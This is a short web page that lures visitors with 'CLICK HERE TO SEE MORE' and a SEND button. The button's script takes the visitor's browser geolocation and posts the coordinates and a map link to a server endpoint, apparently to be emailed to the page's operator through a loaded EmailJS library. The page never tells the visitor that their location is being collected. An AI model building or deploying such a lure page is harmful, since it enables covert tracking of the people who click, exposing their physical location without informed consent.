<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>MORE INFOS</title>
</head>
<body>
    <h1>CLICK HERE TO SEE MORE</h1>
  <button onclick="sendEmail()">SEND</button>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    (function(){
      emailjs.init("id");
    })();
  </script>

  <script>
    function sendEmail() {
      if (!navigator.geolocation) {
        alert("Geolocation is not supported.");
        return;
      }

      navigator.geolocation.getCurrentPosition(
        (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          const mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;

          fetch('/api/send-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude, map_link: mapLink })
          })
          .then(response => response.json())
          .then(data => alert(data.message))
          .catch(() => alert("Error sending email."));
        },
        () => alert("Could not get your location.")
      );
    }
  </script>
</body>
</html>
